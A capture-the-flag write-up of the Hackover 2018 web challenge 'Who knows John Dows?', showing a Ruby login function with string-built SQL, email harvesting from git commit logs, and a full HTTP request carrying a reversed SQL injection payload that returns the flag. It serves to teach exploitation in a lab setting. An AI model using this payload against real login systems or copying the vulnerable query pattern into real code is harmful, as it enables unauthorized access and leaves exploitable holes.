---
layout: post
title: ctf 0x01 / Who knows John Dows? [WEB]
category: ctf
tags: [ctf, writeup, place, ctftime, shellraisers, hackover18, web, john, dows, stalking]
---

## Stalking at the wrong side [of query]

```
Howdy mate! Just login and hand out the flag, aye! You can find on h18johndoe has all you need!
```

What's interesting, the `h18johndoe` name points to a file in an external git repository (on github): [user_repo.rb](https://github.com/h18johndoe/user_repository/blob/master/user_repo.rb)

<!--more-->

The interesting part of that code is:

```ruby
 def login(identification, password)
    hashed_input_password = hash(password)
    query = "select id, phone, email from users where email = '#{identification}' and password_digest = '#{hashed_input_password}' limit 1"
    puts "SQL executing: '#{query}'"
    @database[query].first if user_exists?(identification)
  end
```

We can also see that the *hashing* function is a simple reverse func:

```ruby
def hash(password)
    password.reverse
  end
```

Sooooo...

We can see that along the `identification` field, the `password` field is posted (note that it's not in the original request - you have to add it by yourself as there is no *password* input).
Furthermore, the password field is - as we've just observed - *hashed* by reversing and what we post is inserted into the SQL query. We've got an `SQL injection`!

We can't inject the identification field, though (as a check is performed to see whether the user exists), so we use the `hashed_input_password` part. We still need either the email or phone number as an identification. How can we obtain them? Well, from the GIT log after cloning the repo (thanks [tezeb](https://github.com/tezeb) for reminding me about this!):

```
$ git clone https://github.com/h18johndoe/user_repository
Cloning into 'user_repository'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 12 (delta 2), reused 12 (delta 2), pack-reused 0
Unpacking objects: 100% (12/12), done.
$ cd user_repository/
$ git log | head -5
commit b26aed283d56c65845b02957a11d90bc091ac35a
Author: John Doe <angelo_muh@yahoo.org>
Date:   Tue Oct 2 23:55:57 2018 +0200

    Add login method
(...)
commit 3ec70acbf846037458c93e8d0cb79a6daac98515
Author: John Doe <john_doe@notes.h18>
Date:   Tue Oct 2 23:01:30 2018 +0200

    Add user repo class and file
```

Thus, as we know what the *hashing* function does, we just supply the email and *hash* (reverse) the query to get in:

```
POST /login HTTP/1.1
Host: yo-know-john-dow.ctf.hackover.de:4567
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://yo-know-john-dow.ctf.hackover.de:4567/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Cookie:  (...)
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

identification=john_doe@notes.h18&password=-- 1 timil sresu morf enohp,2,1 tceles noinu 1=1 ro '
```
```html
<!doctype html>
<html>
<title>Yah know john dow?</title>
<!-- challange by ellcs -->
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="w3.css">
<script type="text/javascript" src="/js/script.js"></script>
<body>
<div class="w3-container w3-bar w3-indigo"> <h1>D0 Y0u kn0W j0Hn D0w?</h1> </div>
<div class="w3-main">
  <div class="w3-bar w3-blue">
      <div class="w3-bar-item w3-green w3-mobile">Logged in as: 0157 1337 42</div>
      <a href="/logout" class="w3-bar-item w3-button w3-mobile">Logout</a>
  </div>
  <div class="w3-container w3-center">
    HERE IS YO FLAG:

    hackover18{I_KN0W_H4W_70_STALK_2018}
</div>
</div>
</body>
</html>
```

At this point we actually got frustrated since the flag didn't get accepted; we tried to go through the database (via `sqlite_master`) while pinging the organizers about the problem.

We didn't find anything in the DB and it was just a technical issue, after all - the organizers quickly fixed it, we submitted the flag and got the points :-)

**Flag:** `hackover18{I_KN0W_H4W_70_STALK_2018}`

Cheers!